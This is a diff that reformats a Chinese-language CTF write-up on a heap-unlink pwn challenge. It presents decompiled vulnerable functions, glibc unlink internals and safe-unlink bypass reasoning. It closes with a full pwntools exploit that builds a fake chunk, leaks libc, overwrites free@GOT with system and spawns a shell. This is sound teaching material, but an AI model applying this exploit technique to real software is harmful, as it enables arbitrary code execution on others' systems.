@@ -17,133 +17,138 @@ tags:
 
 1，检查保护
 
-	[*] '/home/chris/Pwn/heap-unlink'
-	    Arch:     i386-32-little
-	    RELRO:    No RELRO
-	    Stack:    No canary found
-	    NX:       NX enabled
-	    PIE:      No PIE (0x8048000)
-
+```python
+[*] '/home/chris/Pwn/heap-unlink'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
 2，使用IDA分析程序流程
 
-main 函数分析
+**main 函数分析**
 
-	void __cdecl main()
-	{
-	  int v0;   #[esp+Ch] [ebp-Ch]
-	
-	  v0 = 0;
-	  setbuf(stdout, 0);
-	  setbuf(stdin, 0);
-	  while ( 1 )
-	  {
-	    sub_804858B();
-	    v0 = -1;
-	    __isoc99_scanf("%d", &v0);
-	    switch ( v0 )
-	    {
-	      case 1:
-	        sub_80485F7();
-	        break;
-	      case 2:
-	        sub_804867D();
-	        break;
-	      case 3:
-	        sub_8048702();
-	        break;
-	      case 4:
-	        sub_804876C();
-	        break;
-	      case 5:
-	        exit(0);
-	        return;
-	      default:
-	        continue;
-	    }
-	  }
-	}
+```c
+void __cdecl main()
+{
+  int v0;   #[esp+Ch] [ebp-Ch]
 
+  v0 = 0;
+  setbuf(stdout, 0);
+  setbuf(stdin, 0);
+  while ( 1 )
+  {
+    sub_804858B();
+    v0 = -1;
+    __isoc99_scanf("%d", &v0);
+    switch ( v0 )
+    {
+      case 1:
+        sub_80485F7();
+        break;
+      case 2:
+        sub_804867D();
+        break;
+      case 3:
+        sub_8048702();
+        break;
+      case 4:
+        sub_804876C();
+        break;
+      case 5:
+        exit(0);
+        return;
+      default:
+        continue;
+    }
+  }
+}
+```
 读入你输入的选项，然后执行对应的函数
 
-Add 函数分析
+**Add 函数分析**
 
-	void *sub_80485F7()
-	{
-	  void *result;   #eax
-	  int v1;   #ebx
-	  size_t size;   #[esp+Ch] [ebp-Ch]
-	
-	  size = 0;
-	  if ( dword_8049D88 > 9 )
-	    return (void *)write(1, "cannot add chunks!", 0x12u);
-	  write(1, "Input the size of chunk you want to add:", 0x28u);
-	  __isoc99_scanf("%d", &size);
-	  result = (void *)size;
-	  if ( (signed int)size > 0 )
-	  {
-	    v1 = dword_8049D88++;
-	    result = malloc(size);
-	    buf[v1] = result;
-	  }
-	  return result;
-	}
+```c
+void *sub_80485F7()
+{
+  void *result;   #eax
+  int v1;   #ebx
+  size_t size;   #[esp+Ch] [ebp-Ch]
 
+  size = 0;
+  if ( dword_8049D88 > 9 )
+    return (void *)write(1, "cannot add chunks!", 0x12u);
+  write(1, "Input the size of chunk you want to add:", 0x28u);
+  __isoc99_scanf("%d", &size);
+  result = (void *)size;
+  if ( (signed int)size > 0 )
+  {
+    v1 = dword_8049D88++;
+    result = malloc(size);
+    buf[v1] = result;
+  }
+  return result;
+}
+```
 这里分析出来一个指针数组
 
 	  char * buf[n]
 
+**Set 函数分析**
 
-Set 函数分析
-	
-	ssize_t sub_804867D()
-	{
-	  int v1;   #[esp+Ch] [ebp-Ch]
-	
-	  v1 = -1;
-	  write(1, "Set chunk index:", 0x10u);
-	  __isoc99_scanf("%d", &v1);
-	  if ( v1 < 0 )
-	    return write(1, "Set chunk data error!\n", 0x16u);
-	  write(1, "Set chunk data:", 0xFu);
-	  return read(0, buf[v1], 0x400u);
-	}
+```c
+ssize_t sub_804867D()
+{
+  int v1;   #[esp+Ch] [ebp-Ch]
 
+  v1 = -1;
+  write(1, "Set chunk index:", 0x10u);
+  __isoc99_scanf("%d", &v1);
+  if ( v1 < 0 )
+    return write(1, "Set chunk data error!\n", 0x16u);
+  write(1, "Set chunk data:", 0xFu);
+  return read(0, buf[v1], 0x400u);
+}
+```
 设置add的堆空间内容
 
-Delete 函数分析
+**Delete 函数分析**
 
-	void sub_8048702()
-	{
-	  int v0;   #[esp+Ch] [ebp-Ch]
-	
-	  v0 = -1;
-	  write(1, "Delete chunk index:", 0x13u);
-	  __isoc99_scanf("%d", &v0);
-	  if ( v0 >= 0 )
-	    free(buf[v0]);
-	  else
-	    write(1, "Delete chunk error!\n", 0x14u);
-	}
+```c
+void sub_8048702()
+{
+  int v0;   #[esp+Ch] [ebp-Ch]
 
-`free后指针未置零`
+  v0 = -1;
+  write(1, "Delete chunk index:", 0x13u);
+  __isoc99_scanf("%d", &v0);
+  if ( v0 >= 0 )
+    free(buf[v0]);
+  else
+    write(1, "Delete chunk error!\n", 0x14u);
+}
+```
+free后指针未置零
 
-Print 函数分析
+**Print 函数分析**
 
-		ssize_t sub_804876C()
-		{
-		  ssize_t result;   #eax
-		  int v1;   #[esp+Ch] [ebp-Ch]
-		
-		  v1 = -1;
-		  write(1, "Print chunk index:", 0x12u);
-		  __isoc99_scanf("%d", &v1);
-		  if ( v1 >= 0 )
-		    result = write(1, buf[v1], 0x100u);
-		  else
-		    result = write(1, "Print chunk error!\n", 0x13u);
-		  return result;
-		}
+```c
+ssize_t sub_804876C()
+{
+  ssize_t result;   #eax
+  int v1;   #[esp+Ch] [ebp-Ch]
 
+  v1 = -1;
+  write(1, "Print chunk index:", 0x12u);
+  __isoc99_scanf("%d", &v1);
+  if ( v1 >= 0 )
+    result = write(1, buf[v1], 0x100u);
+  else
+    result = write(1, "Print chunk error!\n", 0x13u);
+  return result;
+}
+```
 该函数的功能就是输出buf[ ]指向内存区域的内容。
 
 ## 0x01 漏洞分析
@@ -158,30 +163,31 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 相关代码如下：
 
-	#!c
-	    /*malloc.c  int_free函数中*/
-	/*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/
-	/* consolidate backward */
-	    if (!prev_inuse(p)) {
-	      prevsize = p->prev_size;
-	size += prevsize;
-	  #修改指向当前chunk的指针，指向前一个chunk。
-	      p = chunk_at_offset(p, -((long) prevsize)); 
-	      unlink(p, bck, fwd);
-	}   
-	
-	  #相关函数说明：
-	/* Treat space at ptr + offset as a chunk */
-	#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) 
-	
-	/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
-	#define unlink(P, BK, FD) {                                            \
-	    FD = P->fd;                                   \
-	    BK = P->bk;                                   \
-	    FD->bk = BK;                                  \
-	    BK->fd = FD;                                  \
-	    ...
-	}
+```c
+    /*malloc.c  int_free函数中*/
+/*这里p指向当前malloc_chunk结构体，bck和fwd分别为当前chunk的向后和向前一个free chunk*/
+/* consolidate backward */
+    if (!prev_inuse(p)) {
+      prevsize = p->prev_size;
+size += prevsize;
+  #修改指向当前chunk的指针，指向前一个chunk。
+      p = chunk_at_offset(p, -((long) prevsize)); 
+      unlink(p, bck, fwd);
+}   
+
+  #相关函数说明：
+/* Treat space at ptr + offset as a chunk */
+#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) 
+
+/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/
+#define unlink(P, BK, FD) {                                            \
+    FD = P->fd;                                   \
+    BK = P->bk;                                   \
+    FD->bk = BK;                                  \
+    BK->fd = FD;                                  \
+    ...
+}
+```
 
 首先检测前一个chunk是否为free，这可以通过检测当前free chunk的PREV_INUSE(P)比特位知晓。在本例中，当前chunk（first chunk）的前一个chunk是allocated的，因为在默认情况下，堆内存中的第一个chunk总是被设置为allocated的，即使它根本就不存在。
 
@@ -197,61 +203,61 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 首先检测next chunk是否为free。那么如何检测呢？很简单，查询next chunk之后的chunk的 PREV_INUSE (P)即可。相关代码如下：
 
-	#!c
-	……
-	/*这里p指向当前chunk*/
-	nextchunk = chunk_at_offset(p, size);
-	……
-	nextsize = chunksize(nextchunk);
-	……
-	if (nextchunk != av->top) { 
-	      /* get and clear inuse bit */
-	      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  #判断nextchunk是否为free chunk
-	      /* consolidate forward */
-	      if (!nextinuse) {   #next chunk为free chunk
-	            unlink(nextchunk, bck, fwd);   #将nextchunk从链表中移除
-	          size += nextsize;   #p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
-	      } else
-	            clear_inuse_bit_at_offset(nextchunk, 0);    
-	
-	      ……
-	    }
+```c
+……
+/*这里p指向当前chunk*/
+nextchunk = chunk_at_offset(p, size);
+……
+nextsize = chunksize(nextchunk);
+……
+if (nextchunk != av->top) { 
+      /* get and clear inuse bit */
+      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  #判断nextchunk是否为free chunk
+      /* consolidate forward */
+      if (!nextinuse) {   #next chunk为free chunk
+            unlink(nextchunk, bck, fwd);   #将nextchunk从链表中移除
+          size += nextsize;   #p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！
+      } else
+            clear_inuse_bit_at_offset(nextchunk, 0);    
 
+      ……
+    }
+```
 整个操作与”向后合并“操作类似，再通过上述代码结合注释应该很容易理解free chunk的向前结合操作。在本例中当前chunk为first，它的下一个chunk为second，再下一个chunk为top chunk，此时 top chunk的 PREV_INUSE位是设置为1的(表示top chunk的前一个chunk，即second chunk, 已经使用)，因此first的下一个chunk不会被“向前合并“掉。
 
 介绍完向前、向后合并操作，下面就需要了解执行free（）合并后或者**因为不满足合并条件而没合并**的chunk该如何进一步处理了。在glibc malloc中，会将合并后的chunk放到unsorted bin中(还记得unsorted bin的含义么？)。相关代码如下：
 
-	#!c
-	/*
-	 Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.
-	*/  
-	
-	bck = unsorted_chunks(av);   #获取unsorted bin的第一个chunk
-	/*
-	  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
-	    #define unsorted_chunks(M)          (bin_at (M, 1))
-	*/
-	      fwd = bck->fd;
-	      ……
-	      p->fd = fwd;
-	      p->bk = bck;
-	      if (!in_smallbin_range(size))
-	        {
-	          p->fd_nextsize = NULL;
-	          p->bk_nextsize = NULL;
-	        }
-	      bck->fd = p;
-	      fwd->bk = p;  
-	
-	      set_head(p, size | PREV_INUSE);  #设置当前chunk的size,并将前一个chunk标记为已使用
-	set_foot(p, size);  #将后一个chunk的prev_size设置为当前chunk的size
-	/*
-	   /* Set size/use field */
-	   #define set_head(p, s)       ((p)->size = (s))
-	   /* Set size at footer (only when chunk is not in use) */
-	   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->prev_size = (s))
-	*/
+```c
+/*
+ Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.
+*/  
 
+bck = unsorted_chunks(av);   #获取unsorted bin的第一个chunk
+/*
+  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
+    #define unsorted_chunks(M)          (bin_at (M, 1))
+*/
+      fwd = bck->fd;
+      ……
+      p->fd = fwd;
+      p->bk = bck;
+      if (!in_smallbin_range(size))
+        {
+          p->fd_nextsize = NULL;
+          p->bk_nextsize = NULL;
+        }
+      bck->fd = p;
+      fwd->bk = p;  
+
+      set_head(p, size | PREV_INUSE);  #设置当前chunk的size,并将前一个chunk标记为已使用
+set_foot(p, size);  #将后一个chunk的prev_size设置为当前chunk的size
+/*
+   /* Set size/use field */
+   #define set_head(p, s)       ((p)->size = (s))
+   /* Set size at footer (only when chunk is not in use) */
+   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))->prev_size = (s))
+*/
+```
 上述代码完成的整个过程简要概括如下：将当前chunk插入到unsorted bin的第一个chunk(第一个chunk是链表的头结点，为空)与第二个chunk之间(真正意义上的第一个可用chunk)；然后通过设置自己的size字段将前一个chunk标记为已使用；再更改后一个chunk的prev_size字段，将其设置为当前chunk的size；然后更改后一个chunk的size字段的p位，将其设置为0，表示前一个chunk为空闲。
 
 注意：上一段中描述的”前一个“与”后一个“chunk，是指的由chunk的prev_size与size字段隐式连接的chunk，即它们在内存中是连续、相邻的！而不是通过chunk中的fd与bk字段组成的bin(双向链表)中的前一个与后一个chunk，切记！。
@@ -260,25 +266,28 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 >size大小检测
 
-	  #由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
-	if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
-	      malloc_printerr ("corrupted size vs. prev_size"); 
-
+```c
+  #由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
+if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr ("corrupted size vs. prev_size"); 
+```
 >双链表冲突检测
 
-	  #该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了
-	if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
-	  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
-
+```c
+  #该机制会在执行unlink操作的时候检测链表中前一个chunk的fd与后一个chunk的bk是否都指向当前需要unlink的chunk。这样攻击者就无法替换second chunk的fd与fd了
+if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
+  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
+```
 >Double Free检测
 
-	/* Or whether the block is actually not marked used. */
-	    if (__glibc_unlikely (!prev_inuse(nextchunk)))
-	      {
-	            errstr = "double free or corruption (!prev)";
-	            goto errout;
-	      }
-
+```c
+/* Or whether the block is actually not marked used. */
+    if (__glibc_unlikely (!prev_inuse(nextchunk)))
+      {
+            errstr = "double free or corruption (!prev)";
+            goto errout;
+      }
+```
 
 ## 0x03 漏洞利用
 
@@ -320,16 +329,18 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 这样的话将chunk 0的mem空间伪造成一个fake_chunk，其中fake_fd=p32(&chunk0-12) ， fake_bk=p32(&chunk0-8) 这样做的话执行unlink操作时
 
-	FD=P->fd = &chunk0-12 ，
-	BK=P->bk = &chunk0-8 ，
-	FD->bk ，即 *(&chunk0-12+12) = *(&chunk0) = buf[0] = chunk 0 = p 
-	BK->fd ，即*(&chunk0-8+8) = *(&chunk0) = buf[0] = chunk 0 = p
-
+```c
+FD=P->fd = &chunk0-12 ，
+BK=P->bk = &chunk0-8 ，
+FD->bk ，即 *(&chunk0-12+12) = *(&chunk0) = buf[0] = chunk 0 = p 
+BK->fd ，即*(&chunk0-8+8) = *(&chunk0) = buf[0] = chunk 0 = p
+```
 这样就绕过了双向链表检查。
 
-	if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             
-	      malloc_printerr (check_action, "corrupted double-linked list", P);
-
+```c
+if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             
+      malloc_printerr (check_action, "corrupted double-linked list", P);
+```
 接下来绕过前后size检查，这个就很简单，只需将chunk 1的fake_prev_size覆盖为ptr0当前mem空间大小即80，并且fake_chunk的fake_size大小必须为ptr0当前mem空间大小加上p标志位=81.
 
 覆盖chunk 1的fake_size&flag要正确，为偶数代表前一个chunk为空可合并，大小满足原本chunk大小，这样可以避免错误的size大小以致double free报错.
@@ -338,20 +349,21 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 由于在 chunk 1 前面构造了一个伪造的空闲内存块，当free(chunk[1])时，就会对伪造的空闲内存块进行unlink操作：
 
-	F = p -> fd;    #F = &chunk0 - 12
-	B = p -> bk;    #B = &chunk0- 8
-	if (F -> bk == p && B -> fd == p){
-	  F -> bk = B;    #即buf[0] = B = &chunk0 - 8
-	  B -> fd = F;    #即buf[0] = F = &chunk0 -12
-	}
-
+```c
+F = p -> fd;    #F = &chunk0 - 12
+B = p -> bk;    #B = &chunk0- 8
+if (F -> bk == p && B -> fd == p){
+  F -> bk = B;    #即buf[0] = B = &chunk0 - 8
+  B -> fd = F;    #即buf[0] = F = &chunk0 -12
+}
+```
 从上可知，unlink后，buf[0]存的不再是chunk 0 的起始地址了，而是&chunk0 - 12 即 &buf-12。此时我们只关心buf数组的内存，其布局如下：
 
 ![pic2]
 
 #### Leaking
 
-这样我们可以通过set_chunk（0，data = "A" * 12 + p32(&buf-12) + p32(addr)）保持chunk 0指向&buf-12，并覆盖chunk 1地址为addr,leak出system地址
+这样我们可以通过`set_chunk（0，data = "A" * 12 + p32(&buf-12) + p32(addr)）`保持chunk 0指向&buf-12，并覆盖chunk 1地址为addr,leak出system地址
 
 万事俱备，只欠东风~
 
@@ -359,95 +371,96 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 
 ## 0x04 完整脚本
 
-	#!/usr/bin/env python
-	# -*- coding: utf-8 -*-
-	from pwn import *
-	
-	p = process("./heap-unlink")
-	
-	start = 0x8049d60 #start=&chunk0
-	free_got = 0x8049ce8
-	
-	flag = 0
-	def leak(addr):
-	    data = "A" * 0xc + p32(start-0xc) + p32(addr)
-	    global flag
-	    if flag == 0:
-	        set_chunk(0, data)
-	        flag = 1
-	    else:
-	        set_chunk2(0, data)
-	    data = ""
-	    p.recvuntil('5.Exit\n')
-	    data = print_chunk(1)
-	    print("leaking: %#x ---> %s" % (addr, data[0:4].encode('hex')))
-	    return data[0:4]
-	
-	def add_chunk(len):
-	    print p.recvuntil('\n')
-	    p.sendline('1')
-	    print p.recvuntil('Input the size of chunk you want to add:')
-	    p.sendline(str(len))
-	
-	def set_chunk(index,data):
-	    p.recvuntil('5.Exit\n')
-	    p.sendline('2')
-	    p.recvuntil('Set chunk index:')
-	    p.sendline(str(index))
-	    p.recvuntil('Set chunk data:')
-	    p.sendline(data)
-	
-	def set_chunk2(index, data):
-	    p.sendline('2')
-	    p.recvuntil('Set chunk index:')
-	    p.sendline(str(index))
-	    p.recvuntil('Set chunk data:')
-	    p.sendline(data)
-	
-	def del_chunk(index):
-	    p.recvuntil('\n')
-	    p.sendline('3')
-	    p.recvuntil('Delete chunk index:')
-	    p.sendline(str(index))
-	
-	def print_chunk(index):
-	    p.sendline('4')
-	    p.recvuntil('Print chunk index:')
-	    p.sendline(str(index))
-	    res = p.recvuntil('5.Exit\n')
-	    return res
-	
-	add_chunk(80)  #0
-	add_chunk(80)  #1
-	add_chunk(80)  #2
-	add_chunk(80)  #3
-	set_chunk(3, '/bin/sh')
-	
-	#fake_chunk
-	payload = ""
-	payload += p32(0) + p32(81) + p32(start-12) + p32(start-8)
-	payload += "A"*(80-4*4)
-	payload += p32(80) + p32(88)
-	
-	set_chunk(0,payload)
-	
-	del_chunk(1)
-	
-	#leak system_addr
-	pwn_elf = ELF('./heap-unlink')
-	d = DynELF(leak, elf=pwn_elf)
-	sys_addr = d.lookup('system', 'libc')
-	print("system addr: %#x" % sys_addr)
-	
-	data = "A" * 12 + p32(start-12) + p32(free_got)
-	set_chunk2('0', data)
-	
-	set_chunk2('1', p32(sys_addr))
-	
-	del_chunk('3')
-	p.interactive()
-	p.close()
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
 
+p = process("./heap-unlink")
+
+start = 0x8049d60 #start=&chunk0
+free_got = 0x8049ce8
+
+flag = 0
+def leak(addr):
+    data = "A" * 0xc + p32(start-0xc) + p32(addr)
+    global flag
+    if flag == 0:
+        set_chunk(0, data)
+        flag = 1
+    else:
+        set_chunk2(0, data)
+    data = ""
+    p.recvuntil('5.Exit\n')
+    data = print_chunk(1)
+    print("leaking: %#x ---> %s" % (addr, data[0:4].encode('hex')))
+    return data[0:4]
+
+def add_chunk(len):
+    print p.recvuntil('\n')
+    p.sendline('1')
+    print p.recvuntil('Input the size of chunk you want to add:')
+    p.sendline(str(len))
+
+def set_chunk(index,data):
+    p.recvuntil('5.Exit\n')
+    p.sendline('2')
+    p.recvuntil('Set chunk index:')
+    p.sendline(str(index))
+    p.recvuntil('Set chunk data:')
+    p.sendline(data)
+
+def set_chunk2(index, data):
+    p.sendline('2')
+    p.recvuntil('Set chunk index:')
+    p.sendline(str(index))
+    p.recvuntil('Set chunk data:')
+    p.sendline(data)
+
+def del_chunk(index):
+    p.recvuntil('\n')
+    p.sendline('3')
+    p.recvuntil('Delete chunk index:')
+    p.sendline(str(index))
+
+def print_chunk(index):
+    p.sendline('4')
+    p.recvuntil('Print chunk index:')
+    p.sendline(str(index))
+    res = p.recvuntil('5.Exit\n')
+    return res
+
+add_chunk(80)  #0
+add_chunk(80)  #1
+add_chunk(80)  #2
+add_chunk(80)  #3
+set_chunk(3, '/bin/sh')
+
+#fake_chunk
+payload = ""
+payload += p32(0) + p32(81) + p32(start-12) + p32(start-8)
+payload += "A"*(80-4*4)
+payload += p32(80) + p32(88)
+
+set_chunk(0,payload)
+
+del_chunk(1)
+
+#leak system_addr
+pwn_elf = ELF('./heap-unlink')
+d = DynELF(leak, elf=pwn_elf)
+sys_addr = d.lookup('system', 'libc')
+print("system addr: %#x" % sys_addr)
+
+data = "A" * 12 + p32(start-12) + p32(free_got)
+set_chunk2('0', data)
+
+set_chunk2('1', p32(sys_addr))
+
+del_chunk('3')
+p.interactive()
+p.close()
+```
 ## 0x05 总结
 
 多调试，别凭空想,多看glibc源码！
